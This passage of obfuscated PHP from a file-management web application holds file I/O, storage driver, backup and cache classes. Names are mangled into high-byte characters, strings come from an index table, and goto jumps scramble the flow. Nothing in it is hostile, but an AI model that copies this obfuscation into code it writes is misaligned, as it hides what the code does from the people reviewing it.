$this->iconvApp($¸Á†•ôö); if ($›Š™Ğù‰) { return $this->getPathOuter($¸Á†•ôö); } $this->writeLog(__FUNCTION__ . $ºèƒŸ·®[1461], !0); return !1; } public function size($’óÙÂîº) { $’óÙÂîº = $this->iconvSystem($’óÙÂîº); return filesize_64($’óÙÂîº); } public function info($ÒÇşÈ™) { $ÒÇşÈ™ = $this->iconvSystem($ÒÇşÈ™); if ($this->isFolder($ÒÇşÈ™)) { return $this->folderInfo($ÒÇşÈ™); } else { if ($this->isFile($ÒÇşÈ™)) { return $this->fileInfo($ÒÇşÈ™); } } return !1; } protected function infoChildren($µñ±şÆ·, &$ºØò„€©, $Ìš…àİ³ = true) { $Œš”ŸŠ” =& $_SERVER[Ùæõ‰Ï’]; check_abort_echo(); $µñ±şÆ· = rtrim($µñ±şÆ·, $Œš”ŸŠ”[8]) . $Œš”ŸŠ”[8]; if ($Ìš…àİ³) { $µñ±şÆ· = $this->iconvSystem($µñ±şÆ·); } if (!($¼§şà¼® = @opendir($µñ±şÆ·))) { return; } while (($¼ÎéÆ” = readdir($¼§şà¼®)) !== !1) { if ($¼ÎéÆ” == $Œš”ŸŠ”[10] || $¼ÎéÆ” == $Œš”ŸŠ”[1376]) { continue; } $Óôöô–Î = $µñ±şÆ· . $¼ÎéÆ”; if (is_file($Óôöô–Î) || is_link($Óôöô–Î)) { $ºØò„€©[$Œš”ŸŠ”[80]]++; $ºØò„€©[$Œš”ŸŠ”[79]] += filesize_64($Óôöô–Î); } else { if (is_dir($Óôöô–Î)) { $ºØò„€©[$Œš”ŸŠ”[81]]++; $this->infoChildren($Óôöô–Î, $ºØò„€©, !1); } } } closedir($¼§şà¼®); } private function folderInfo($¿–Şüõ, $£…¹‚Ê· = false) { $ÜèËâ‡ =& $_SERVER[Ùæõ‰Ï’]; $¿–Şüõ = rtrim($¿–Şüõ, $ÜèËâ‡[8]) . $ÜèËâ‡[8]; $¤‘ĞÁÇ¹ = $this->iconvApp($this->pathThis($¿–Şüõ)); if ($£…¹‚Ê·) { return array($ÜèËâ‡[32] => $¤‘ĞÁÇ¹, $ÜèËâ‡[87] => $this->getPathOuter($¿–Şüõ), $ÜèËâ‡[33] => $ÜèËâ‡[78]); } $ÌÕßöÜ¯ = array($ÜèËâ‡[32] => $¤‘ĞÁÇ¹, $ÜèËâ‡[87] => $this->getPathOuter($¿–Şüõ), $ÜèËâ‡[33] => $ÜèËâ‡[78], $ÜèËâ‡[231] => @filectime($¿–Şüõ), $ÜèËâ‡[88] => @filemtime($¿–Şüõ), $ÜèËâ‡[1465] => @fileatime($¿–Şüõ), $ÜèËâ‡[1466] => is_readable($¿–Şüõ), $ÜèËâ‡[1467] => is_writable($¿–Şüõ), $ÜèËâ‡[1468] => get_mode($¿–Şüõ)); return $ÌÕßöÜ¯; } private function fileInfo($œŠÁÇÆ£, $ü ×öÉÒ = false) { $şÉ´‚Óú =& $_SERVER[Ùæõ‰Ï’]; $¶åÀéï× = $this->iconvApp($this->pathThis($œŠÁÇÆ£)); if ($ü ×öÉÒ) { return array($şÉ´‚Óú[32] => $¶åÀéï×, $şÉ´‚Óú[87] => $this->getPathOuter($œŠÁÇÆ£), $şÉ´‚Óú[33] => $şÉ´‚Óú[230], $şÉ´‚Óú[79] => $this->size($œŠÁÇÆ£), $şÉ´‚Óú[169] => $this->ext($¶åÀéï×)); } $’ƒıíÀõ = array($şÉ´‚Óú[32] => $¶åÀéï×, $şÉ´‚Óú[87] => $this->getPathOuter($œŠÁÇÆ£), $şÉ´‚Óú[33] => $şÉ´‚Óú[230], $şÉ´‚Óú[231] => @filectime($œŠÁÇÆ£), $şÉ´‚Óú[88] => @filemtime($œŠÁÇÆ£), $şÉ´‚Óú[1465] => @fileatime($œŠÁÇÆ£), $şÉ´‚Óú[79] => $this->size($œŠÁÇÆ£), $şÉ´‚Óú[169] => $this->ext($¶åÀéï×), $şÉ´‚Óú[1466] => is_readable($œŠÁÇÆ£), $şÉ´‚Óú[1467] => is_writable($œŠÁÇÆ£), $şÉ´‚Óú[1468] => get_mode($œŠÁÇÆ£)); return $’ƒıíÀõ; } public function exist($ü ‚¯) { $ü ‚¯ = $this->iconvSystem($ü ‚¯); return @file_exists($ü ‚¯); } public function isFile($÷òê‹‚) { $÷òê‹‚ = $this->iconvSystem($÷òê‹‚); return @is_file($÷òê‹‚); } public function isFolder($ÓºñÔ×ï) { $ÓºñÔ×ï = $this->iconvSystem($ÓºñÔ×ï); return @is_dir($ÓºñÔ×ï); } public function listPath($Ç÷›–Å¹, $÷İ¸àå² = false) { $èĞƒÂö„ =& $_SERVER[Ùæõ‰Ï’]; $Ç÷›–Å¹ = $this->iconvSystem($Ç÷›–Å¹); $Ç÷›–Å¹ = rtrim($Ç÷›–Å¹, $èĞƒÂö„[8]) . $èĞƒÂö„[8]; $à«Æ¨×Œ = array($èĞƒÂö„[85] => array(), $èĞƒÂö„[86] => array()); if (!($ø¨¬Õ¥Ì = @opendir($Ç÷›–Å¹))) { return $à«Æ¨×Œ; } while (($ÜĞÛâ©ß = readdir($ø¨¬Õ¥Ì)) !== !1) { if ($ÜĞÛâ©ß == $èĞƒÂö„[10] || $ÜĞÛâ©ß == $èĞƒÂö„[1376]) { continue; } $ŠÅÓÆÎŞ = $Ç÷›–Å¹ . $ÜĞÛâ©ß; if (is_file($ŠÅÓÆÎŞ)) { $à«Æ¨×Œ[$èĞƒÂö„[86]][] = $this->fileInfo($ŠÅÓÆÎŞ, $÷İ¸àå²); } else { $à«Æ¨×Œ[$èĞƒÂö„[85]][] = $this->folderInfo($ŠÅÓÆÎŞ, $÷İ¸àå²); } } closedir($ø¨¬Õ¥Ì); return $à«Æ¨×Œ; } public function listAll($”ŒöÎÆ, &$±­å¾Î© = array()) { $òÊ±äÚâ =& $_SERVER[Ùæõ‰Ï’]; $”ŒöÎÆ = $this->iconvSystem($”ŒöÎÆ); $”ŒöÎÆ = rtrim($”ŒöÎÆ, $òÊ±äÚâ[8]) . $òÊ±äÚâ[8]; if (!($‡Ï“Ïø¸ = @opendir($”ŒöÎÆ))) { return $±­å¾Î©; } while (($Ò¥ÇˆŸ® = readdir($‡Ï“Ïø¸)) !== !1) { if ($Ò¥ÇˆŸ® == $òÊ±äÚâ[10] || $Ò¥ÇˆŸ® == $òÊ±äÚâ[1376]) { continue; } $›•¼’×ı = $”ŒöÎÆ . $Ò¥ÇˆŸ®; $œŠ·ï¥© = is_dir($›•¼’×ı) && !is_link($›•¼’×ı) ? 1 : 0; $›•¼’×ı = $œŠ·ï¥© ? $›•¼’×ı . $òÊ±äÚâ[8] : $›•¼’×ı; $±­å¾Î©[] = array($òÊ±äÚâ[87] => $›•¼’×ı, $òÊ±äÚâ[78] => $œŠ·ï¥©, $òÊ±äÚâ[88] => intval(@filemtime($›•¼’×ı)), $òÊ±äÚâ[79] => $œŠ·ï¥© ? 0 : intval($this->size($›•¼’×ı))); if ($œŠ·ï¥©) { $this->listAll($›•¼’×ı, $±­å¾Î©); } } closedir($‡Ï“Ïø¸); return $±­å¾Î©; } public function has($üñûÜ¬Ã, $îÛÜõŞ÷ = false, $êš©Ø¢ = true) { $…¤İ‰Õ =& $_SERVER[Ùæõ‰Ï’]; $üñûÜ¬Ã = $this->iconvSystem($üñûÜ¬Ã); $üñûÜ¬Ã = rtrim($üñûÜ¬Ã, $…¤İ‰Õ[8]) . $…¤İ‰Õ[8]; if (!($§ìÚ«ãÎ = @opendir($üñûÜ¬Ã))) { return !1; } $ÊêåÜ = 0; $ÖÓ ÅØé = 0; $ÜÌç«è = 0; while (($Ñ‘±Ö˜Ë = readdir($§ìÚ«ãÎ)) !== !1) { if ($Ñ‘±Ö˜Ë == $…¤İ‰Õ[10] || $Ñ‘±Ö˜Ë == $…¤İ‰Õ[1376]) { continue; } $•¥’˜ª¤ = $üñûÜ¬Ã . $Ñ‘±Ö˜Ë; if ($îÛÜõŞ÷) { $ÜÌç«è++; if (@is_file($•¥’˜ª¤)) { $ÊêåÜ++; } else { $ÖÓ ÅØé++; } if ($ÜÌç«è > 10000) { break; } continue; } if ($êš©Ø¢) { if (@is_file($•¥’˜ª¤)) { return !0; } } else { if (@is_dir($•¥’˜ª¤ . $…¤İ‰Õ[8])) { return !0; } } } closedir($§ìÚ«ãÎ); if ($îÛÜõŞ÷) { return array($…¤İ‰Õ[239] => $ÊêåÜ, $…¤İ‰Õ[240] => $ÖÓ ÅØé); } return !1; } public function hashSimple($¶ş™îèï) { $ å±ÑØå =& $_SERVER[Ùæõ‰Ï’]; if (!$¶ş™îèï) { return md5($ å±ÑØå[12]); } $¶ş™îèï = $this->iconvSystem($¶ş™îèï); $­ÍôÆ„” = $this->size($¶ş™îèï); $Èº½‘šé = 200; $Á¹ÎÀ¡‹ = 50; if ($­ÍôÆ„” <= $Èº½‘šé * $Á¹ÎÀ¡‹) { return $this->hashMd5($¶ş™îèï) . $­ÍôÆ„”; } $±¦âíæÂ = $ å±ÑØå[12]; $ç°·Áû« = intval($­ÍôÆ„” / $Á¹ÎÀ¡‹); $ğµŞˆ× = fopen($¶ş™îèï, $ å±ÑØå[1469]); if (!$ğµŞˆ×) { return $±¦âíæÂ; } for ($›îÊ¡ç‰ = 0; $›îÊ¡ç‰ < $Á¹ÎÀ¡‹; $›îÊ¡ç‰++) { fseek_64($ğµŞˆ×, $ç°·Áû« * $›îÊ¡ç‰); $±¦âíæÂ .= fread($ğµŞˆ×, $Èº½‘šé); } fseek_64($ğµŞˆ×, $­ÍôÆ„” - $Èº½‘šé); $±¦âíæÂ .= fread($ğµŞˆ×, $Èº½‘šé); fclose($ğµŞˆ×); return md5($±¦âíæÂ) . $­ÍôÆ„”; } public function getContent($Ã”’æëÓ) { $Ã”’æëÓ = $this->iconvSystem($Ã”’æëÓ); return file_get_contents($Ã”’æëÓ); } public function setContent($¢é¹Ûî”, $¤ëÁŸÑ = '') { $¢é¹Ûî” = $this->iconvSystem($¢é¹Ûî”); $£ÅïÜèŠ = @file_put_contents($¢é¹Ûî”, $¤ëÁŸÑ, LOCK_EX); if (!$£ÅïÜèŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); } clearstatcache(); @chmod($¢é¹Ûî”, $this->pathAuth); return $£ÅïÜèŠ === !1 ? !1 : !0; } public function fileSubstr($Õ´ÈÅôÏ, $ÊªØ´¶ = 0, $Ø°œÚò› = false) { $æ‚µº =& $_SERVER[Ùæõ‰Ï’]; $Õ´ÈÅôÏ = $this->iconvSystem($Õ´ÈÅôÏ); if ($Ø°œÚò› === !1) { $Ø°œÚò› = $this->size($Õ´ÈÅôÏ); } if ($Ø°œÚò› <= 0) { return $æ‚µº[12]; } $Ø½¬Ê÷¥ = fopen($Õ´ÈÅôÏ, $æ‚µº[1469]); if (!$Ø½¬Ê÷¥) { return !1; } fseek_64($Ø½¬Ê÷¥, $ÊªØ´¶); $Ë­©” = fread($Ø½¬Ê÷¥, $Ø°œÚò›); fclose($Ø½¬Ê÷¥); if (!$Ë­©”) { $this->writeLog(__FUNCTION__ . $æ‚µº[1461], !0); } return $Ë­©”; } public function upload($†Å¥ ©’, $õƒ”Ì…Í, $ò¾İ•Ü¦ = false, $€œãíàš = REPEAT_REPLACE) { if ($ò¾İ•Ü¦) { return $this->moveFile($õƒ”Ì…Í, $†Å¥ ©’); } return $this->copyFile($õƒ”Ì…Í, $†Å¥ ©’); } public function setModifyTime($½Ş½ñ, $ÀıĞş®· = '') { @touch($½Ş½ñ, intval($ÀıĞş®·)); } public function download($Ö©ÜÁÄ, $£¤¦¼éÀ) { return $this->iconvSystem($Ö©ÜÁÄ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Ëîå¢«) { parent::__construct($Ëîå¢«); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } public function fileOutImage($µµ°Ì², $ñå…£ÏÎ = 250) { $ÊÅĞ›öØ =& $_SERVER[Ùæõ‰Ï’]; if ($this->size($µµ°Ì²) > 1024 * 1024 * 25) { return $this->fileOutImageServer($µµ°Ì², $ñå…£ÏÎ); } $÷õñÛßë = array($ÊÅĞ›öØ[1470] => $ÊÅĞ›öØ[1471] . $ñå…£ÏÎ . $ÊÅĞ›öØ[1472]); $ïñ®ËÙ´ = $this->link($µµ°Ì², $÷õñÛßë); $this->fileOutLink($ïñ®ËÙ´); } public function fileOutLink($„‚äü€) { $ô¦šÃê¿ =& $_SERVER[Ùæõ‰Ï’]; if (substr($„‚äü€, 0, 7) == $ô¦šÃê¿[313]) { $„‚äü€ = $ô¦šÃê¿[314] . substr($„‚äü€, 7); } header($ô¦šÃê¿[175] . $„‚äü€); die; } } goto DØÙ©é¦­; cÈàÜòá¥õ: class BackupDbFile { public function __construct() { } public function index() { $êÍó†Ú =& $_SERVER[Ùæõ‰Ï’]; $±İ¨£»Ó = Backup::get(); $îóÑÓìü = $±İ¨£»Ó[$êÍó†Ú[32]]; $ ÔÚ×ıÔ = $this->tmpFilesPath() . "\142\x61\x63\x6b\x75\160\x5f{$îóÑÓìü}\57"; $ıÓñ˜Ëó = $this->backupPath($±İ¨£»Ó); if (!($ıÓñ˜Ëó = IO::mkdir($ıÓñ˜Ëó))) { return !1; } $ğÄƒ„ıã = IO::listPath($ ÔÚ×ıÔ); $àÈÍå„± = isset($ğÄƒ„ıã[$êÍó†Ú[86]]) ? $ğÄƒ„ıã[$êÍó†Ú[86]] : array(); $†ãìÎÂ = array_sum(array_column($àÈÍå„±, $êÍó†Ú[79])); if (!$†ãìÎÂ) { return !1; } $¶ûì˜şÔ = array($êÍó†Ú[881] => $†ãìÎÂ, $êÍó†Ú[882] => time()); Backup::set($¶ûì˜şÔ); $ùÖŞº°Š = new TaskFileTransfer($êÍó†Ú[883], $êÍó†Ú[866], count($àÈÍå„±), LNG($êÍó†Ú[867]) . $êÍó†Ú[462] . LNG($êÍó†Ú[869]) . $êÍó†Ú[884]); $ùÖŞº°Š->task[$êÍó†Ú[846]] = $†ãìÎÂ; foreach ($ğÄƒ„ıã[$êÍó†Ú[86]] as $®êÚ£ûù) { $ğãû = IO::move($®êÚ£ûù[$êÍó†Ú[87]], $ıÓñ˜Ëó); if (!$ğãû) { $ùÖŞº°Š->end(); $ü¡íµ‡ö = IO::getLastError($êÍó†Ú[885] . $®êÚ£ûù[$êÍó†Ú[87]] . $êÍó†Ú[886] . $ıÓñ˜Ëó . $êÍó†Ú[178]); write_log($ü¡íµ‡ö, $êÍó†Ú[866]); return !1; } } $‘’µÇëİ = new DbManage(); $ô„•È· = $‘’µÇëİ->getSqlFile(); if (!$ô„•È·[$êÍó†Ú[887]] || !$ô„•È·[$êÍó†Ú[13]]) { return !1; } IO::move($ô„•È·[$êÍó†Ú[887]], $ıÓñ˜Ëó); IO::move($ô„•È·[$êÍó†Ú[13]], $ıÓñ˜Ëó); $ùÖŞº°Š->end(); $¶ûì˜şÔ = array($êÍó†Ú[888] => $†ãìÎÂ, $êÍó†Ú[889] => time()); Backup::set($¶ûì˜şÔ); return !0; } private function backupPath($Öå•ÊÌğ) { $ŞöüÏó¨ =& $_SERVER[Ùæõ‰Ï’]; $ŞùÄëê¿ = $Öå•ÊÌğ[$ŞöüÏó¨[32]]; $ÌúùØ³½ = Model($ŞöüÏó¨[853])->get($ŞöüÏó¨[854]); $’¿íù¥ = substr(md5($ŞöüÏó¨[855] . $ÌúùØ³½ . $ŞùÄëê¿), 0, 8); return "\173\x69\157\x3a{$Öå•ÊÌğ[$ŞöüÏó¨[835]]}\x7d\x2f\x64\x61\x74\x61\142\x61\163\x65\57\x62\141\143\153\165\160\x2f" . $ŞùÄëê¿ . $ŞöüÏó¨[11] . $’¿íù¥; } private function tmpFilesPath() { $û Ğü•¤ =& $_SERVER[Ùæõ‰Ï’]; $£ñ£ÜĞø = TEMP_FILES; if ($GLOBALS[$û Ğü•¤[6]][$û Ğü•¤[92]][$û Ğü•¤[879]]) { $£ñ£ÜĞø = $GLOBALS[$û Ğü•¤[6]][$û Ğü•¤[92]][$û Ğü•¤[879]]; if (!mk_dir($£ñ£ÜĞø) || !is_writable($£ñ£ÜĞø) || !IO::mkfile($£ñ£ÜĞø . $û Ğü•¤[880])) { $£ñ£ÜĞø = TEMP_FILES; } } return $£ñ£ÜĞø; } } class BackupFile { public function __construct() { } public function index() { $½ıë•Ü¶ = Backup::get(); $¥š¤ºÎë = $½ıë•Ü¶[$_SERVER[Ùæõ‰Ï’][369]][$_SERVER[Ùæõ‰Ï’][230]][$_SERVER[Ùæõ‰Ï’][541]]; $êÈÉò¦§ = array($_SERVER[Ùæõ‰Ï’][542] => array($_SERVER[Ùæõ‰Ï’][890], $¥š¤ºÎë), $_SERVER[Ùæõ‰Ï’][891] => array($_SERVER[Ùæõ‰Ï’][407], $½ıë•Ü¶[$_SERVER[Ùæõ‰Ï’][835]])); $×¼÷÷©å = (int) Model($_SERVER[Ùæõ‰Ï’][872])->where($êÈÉò¦§)->count($_SERVER[Ùæõ‰Ï’][541]); $äşá¹ì = (int) Model($_SERVER[Ùæõ‰Ï’][872])->where($êÈÉò¦§)->sum($_SERVER[Ùæõ‰Ï’][79]); $ëïÑ­–Ó = new TaskFileTransfer($_SERVER[Ùæõ‰Ï’][892], $_SERVER[Ùæõ‰Ï’][866], $×¼÷÷©å, LNG($_SERVER[Ùæõ‰Ï’][867]) . $_SERVER[Ùæõ‰Ï’][868] . LNG($_SERVER[Ùæõ‰Ï’][893])); $ëïÑ­–Ó->task[$_SERVER[Ùæõ‰Ï’][846]] = $äşá¹ì; $øÓÊüÕ = array($_SERVER[Ùæõ‰Ï’][894] => $×¼÷÷©å, $_SERVER[Ùæõ‰Ï’][895] => $äşá¹ì, $_SERVER[Ùæõ‰Ï’][896] => time()); Backup::set($øÓÊüÕ); $€ ‚ØÂ® = !0; $Çú¾Ş = $this->storeIds(); $È­±ÏöÀ = 1; $ÏÔ–˜Û = 1000; $ÜİàÂûñ = $ÔÃ”÷ÅŞ = 0; $ØÛïîÃ = array(); $¨¼òÃ‚¶ = $­¿åÁá = 0; do { $ãçêêòµ = $_SERVER[Ùæõ‰Ï’][897]; $¢Ààˆµ = Model($_SERVER[Ùæõ‰Ï’][872])->where($êÈÉò¦§)->field($ãçêêòµ)->order($_SERVER[Ùæõ‰Ï’][898])->selectPage($ÏÔ–˜Û, $È­±ÏöÀ); $ÂÆ£Â”» = !empty($¢Ààˆµ[$_SERVER[Ùæõ‰Ï’][445]]) ? $¢Ààˆµ[$_SERVER[Ùæõ‰Ï’][445]] : array(); foreach ($ÂÆ£Â”» as $ÀÇ™Üˆ) { if (!$this->_fileExist($ÀÇ™Üˆ, $ØÛïîÃ, $Çú¾Ş)) { write_log("\x66\151\x6c\145\40\156\x6f\164\x20\x65\170\x69\x73\164\56\146\x69\x6c\x65\x49\104\x3a{$ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][541]]}\54\x20\x70\141\x74\150\72{$ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][87]]}", $_SERVER[Ùæõ‰Ï’][899]); continue; } $Æ¿¡¢â¾ = $ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][87]]; $Ú­·•³ã = "\173\x69\x6f\x3a{$½ıë•Ü¶[$_SERVER[Ùæõ‰Ï’][835]]}\175" . substr($Æ¿¡¢â¾, strlen("\x7b\x69\157\x3a{$ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][900]]}\x7d")); if (IO::exist($Ú­·•³ã)) { $ëïÑ­–Ó->updateFileEnd($ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][32]], $ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][79]]); } else { $Ú­·•³ã = get_path_father($Ú­·•³ã); IO::mkdir($Ú­·•³ã); if (!IO::copy($Æ¿¡¢â¾, $Ú­·•³ã, $_SERVER[Ùæõ‰Ï’][901])) { write_log($_SERVER[Ùæõ‰Ï’][902] . $Æ¿¡¢â¾ . $_SERVER[Ùæõ‰Ï’][886] . $Ú­·•³ã . $_SERVER[Ùæõ‰Ï’][178], $_SERVER[Ùæõ‰Ï’][866]); $€ ‚ØÂ® = !1; break; } } $¥š¤ºÎë = $ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][541]]; $ÔÃ”÷ÅŞ += 1; $ÜİàÂûñ += $ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][79]]; $­¿åÁá += 1; $¨¼òÃ‚¶ += $ÀÇ™Üˆ[$_SERVER[Ùæõ‰Ï’][79]]; if ($ÜİàÂûñ >= 1024 * 1024 * 100) { $øÓÊüÕ = array($_SERVER[Ùæõ‰Ï’][834] => $¥š¤ºÎë, $_SERVER[Ùæõ‰Ï’][903] => $­¿åÁá, $_SERVER[Ùæõ‰Ï’][904] => $¨¼òÃ‚¶); Backup::set($øÓÊüÕ); $ÜİàÂûñ = $ÔÃ”÷ÅŞ = 0; } } $ù±Î£ØÛ = count($ÂÆ£Â”»); $È­±ÏöÀ++; } while ($ù±Î£ØÛ == $ÏÔ–˜Û); $ëïÑ­–Ó->end(); $øÓÊüÕ = array($_SERVER[Ùæõ‰Ï’][905] => 1, $_SERVER[Ùæõ‰Ï’][844] => time(), $_SERVER[Ùæõ‰Ï’][858] => 1, $_SERVER[Ùæõ‰Ï’][834] => $¥š¤ºÎë, $_SERVER[Ùæõ‰Ï’][906] => time()); if ($ÔÃ”÷ÅŞ) { $øÓÊüÕ[$_SERVER[Ùæõ‰Ï’][903]] = $­¿åÁá; $øÓÊüÕ[$_SERVER[Ùæõ‰Ï’][904]] = $¨¼òÃ‚¶; } Backup::set($øÓÊüÕ); return !0; } private function _fileExist($¬œ®ÇÜ, &$ÔÒÊ˜Ø, $¥ñ—Ï÷–) { $˜ÃÖ¢îß =& $_SERVER[Ùæõ‰Ï’]; $ò•°Š› = $¬œ®ÇÜ[$˜ÃÖ¢îß[87]]; if (in_array($¬œ®ÇÜ[$˜ÃÖ¢îß[541]], $ÔÒÊ˜Ø)) { return !1; } if (!in_array($¬œ®ÇÜ[$˜ÃÖ¢îß[900]], $¥ñ—Ï÷–)) { return !1; } if (IO::exist($ò•°Š›)) { return !0; } $åœ”Ò½ó = get_path_father($ò•°Š›); if (IO::exist($åœ”Ò½ó)) { $ÔÒÊ˜Ø[] = $¬œ®ÇÜ[$˜ÃÖ¢îß[541]]; return !1; } $ŒÉ¹‚Å‹ = array($˜ÃÖ¢îß[900] => $¬œ®ÇÜ[$˜ÃÖ¢îß[900]], $˜ÃÖ¢îß[87] => array($˜ÃÖ¢îß[459], "{$åœ”Ò½ó}\45")); $‘ıäĞä = Model($˜ÃÖ¢îß[872])->where($ŒÉ¹‚Å‹)->field($˜ÃÖ¢îß[542])->select(); $ÔÒÊ˜Ø = array_merge($ÔÒÊ˜Ø, array_to_keyvalue($‘ıäĞä, $˜ÃÖ¢îß[12], $˜ÃÖ¢îß[541])); return !1; } private function _fileFilter($¢Çì‰ÈÄ) { $ëÏŒÑõ =& $_SERVER[Ùæõ‰Ï’]; return; if (empty($¢Çì‰ÈÄ)) { return; } $ïÜò…„º = array($ëÏŒÑõ[541] => array($ëÏŒÑõ[7], array_unique($¢Çì‰ÈÄ))); $İ†şÈÀ = Model($ëÏŒÑõ[907])->where($ïÜò…„º)->field($ëÏŒÑõ[193])->select(); foreach ($İ†şÈÀ as $½‹…½ÍÓ) { Model($ëÏŒÑõ[907])->remove($½‹…½ÍÓ[$ëÏŒÑõ[193]], !1); } } private function storeIds() { $Î·ôŠË =& $_SERVER[Ùæõ‰Ï’]; $Çâ¡„Ş = Model($Î·ôŠË[850])->listData(); $Ä»şÌ» = array(); $ö©ë©‹ñ = $GLOBALS[$Î·ôŠË[6]][$Î·ôŠË[92]][$Î·ôŠË[908]]; foreach ($Çâ¡„Ş as $•ÒßÆú‚) { $§Šó— = strtolower($•ÒßÆú‚[$Î·ôŠË[98]]); if (!isset($ö©ë©‹ñ[$§Šó—])) { continue; } $™èóÈ‹ = $Î·ôŠË[77] . (isset($ö©ë©‹ñ[$§Šó—]) ? $ö©ë©‹ñ[$§Šó—] : ucfirst($§Šó—)); if (!class_exists($™èóÈ‹)) { continue; } $Ä»şÌ»[] = $•ÒßÆú‚[$Î·ôŠË[475]]; } return $Ä»şÌ»; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $… ì±æÖ =& $_SERVER[Ùæõ‰Ï’]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ä›£êĞê = $GLOBALS[$… ì±æÖ[6]][$… ì±æÖ[425]]; $¿¡Ğ¿×É = $ä›£êĞê[$ä›£êĞê[$… ì±æÖ[909]]]; $Ó·ü·Ã¶ = $ä›£êĞê[$… ì±æÖ[910]]; switch ($ä›£êĞê[$… ì±æÖ[909]]) { case $… ì±æÖ[21]: self::$handle = Model($… ì±æÖ[911]); break; case $… ì±æÖ[912]: self::$handle = new CacheRedis($¿¡Ğ¿×É, $Ó·ü·Ã¶); break; case $… ì±æÖ[913]: self::$handle = new CacheMemcached($¿¡Ğ¿×É, $Ó·ü·Ã¶); break; case $… ì±æÖ[230]: self::$handle = new CacheFile($¿¡Ğ¿×É, $Ó·ü·Ã¶); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ï–ŞªÂÕ) { if (is_array($ï–ŞªÂÕ) || is_object($ï–ŞªÂÕ)) { $ï–ŞªÂÕ = json_encode($ï–ŞªÂÕ); } $ï–ŞªÂÕ = rawurlencode($ï–ŞªÂÕ); return md5(KOD_SITE_ID . $_SERVER[Ùæõ‰Ï’][11] . $ï–ŞªÂÕ); } public static function get($«ì†“Üá, $ÈÇ’Ó¯™ = false) { $şŞÜ´æˆ = self::key($«ì†“Üá); $ì£¢Ú¸ = self::init(); if ($ÈÇ’Ó¯™) { return unserialize($ì£¢Ú¸->get($şŞÜ´æˆ)); } if (!isset(self::$memoryCache[$şŞÜ´æˆ])) { $®Ãªùäª = $ì£¢Ú¸->get($şŞÜ´æˆ); self::$memoryCache[$şŞÜ´æˆ] = unserialize($®Ãªùäª); } return self::$memoryCache[$şŞÜ´æˆ]; } public static function set($³éÇè©, $°çó§Ì, $ÒÖ°ƒí— = false) { $›·çĞ =& $_SERVER[Ùæõ‰Ï’]; $Éóãüüƒ = self::key($³éÇè©); if (isset(self::$memoryCache[$Éóãüüƒ]) && self::$memoryCache[$Éóãüüƒ] === $°çó§Ì) { return !0; } if ($ÒÖ°ƒí— === 0) { self::$memoryCache[$Éóãüüƒ] = $°çó§Ì; return !0; } $ÙçÅ¦‹ = self::init(); $ô ùğ®È = serialize($°çó§Ì); CacheLock::lock($³éÇè© . $›·çĞ[914]); $¤ÊÅÔÍ× = $ÙçÅ¦‹->set($Éóãüüƒ, $ô ùğ®È, $ÒÖ°ƒí—); self::$memoryCache[$Éóãüüƒ] = $°çó§Ì; CacheLock::unlock($³éÇè© . $›·çĞ[914]); return $¤ÊÅÔÍ×; } public static function getCall($¶„’…à¾, $¡¹½œ÷®, $´½Ÿ½¾è, $Ğ‘Ú™Ë = array()) { $üÆ‚ŞÀ’ =& $_SERVER[Ùæõ‰Ï’]; $Õœš¼Òº = self::get($¶„’…à¾); if ($Õœš¼Òº || $Õœš¼Òº === $üÆ‚ŞÀ’[12]) { return $Õœš¼Òº; } $Õœš¼Òº = call_user_func_array($´½Ÿ½¾è, $Ğ‘Ú™Ë); $Õœš¼Òº = $Õœš¼Òº ? $Õœš¼Òº : $üÆ‚ŞÀ’[12]; self::set($¶„’…à¾, $Õœš¼Òº, $¡¹½œ÷®); return $Õœš¼Òº; } public static function remove($Áë•©ƒ‹) { $”Ò¥Ÿç‹ = self::key($Áë•©ƒ‹); unset(self::$memoryCache[$”Ò¥Ÿç‹]); self::clearTimeout(); CacheLock::lock($Áë•©ƒ‹); $ìºª¾Î = self::init()->remove($”Ò¥Ÿç‹); CacheLock::unlock($Áë•©ƒ‹); return $ìºª¾Î; } public static function removeMemory($õâŞ‰Ë¾) { $‹ş¡È¤í = self::key($õâŞ‰Ë¾); unset(self::$memoryCache[$‹ş¡È¤í]); } public static function clearMemory($§®Æ– ­ = false) { if ($§®Æ– ­) { $§®Æ– ­ = self::key($§®Æ– ­); unset(self::$memoryCache[$§®Æ– ­]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ùæõ‰Ï’][915])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ùæõ‰Ï’][916])) { self::init()->clearTimeout(); } } } goto CÕ±ÛÂå†; D¿³Óˆº›Œ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ã¥óŸÍî) { $Ÿ÷ÛßÓ¦ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ÿ÷ÛßÓ¦[618], $ã¥óŸÍî); $ÜÆØè‡Š = 1; $this->_lockEvent($ã¥óŸÍî, array($Ÿ÷ÛßÓ¦[619], $Ÿ÷ÛßÓ¦[620]), $ÜÆØè‡Š); $this->_lockParent($ã¥óŸÍî, array($Ÿ÷ÛßÓ¦[620]), $ÜÆØè‡Š); $this->_lockEvent($ã¥óŸÍî, array($Ÿ÷ÛßÓ¦[621], $Ÿ÷ÛßÓ¦[622]), $ÜÆØè‡Š); $this->_lockCheckEnd($Ÿ÷ÛßÓ¦[618], $ã¥óŸÍî); } public function lockCopyEnd($Õƒ…şÂè) { $·¶Ó§éŠ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $Ì™ˆŞÜù = 0; 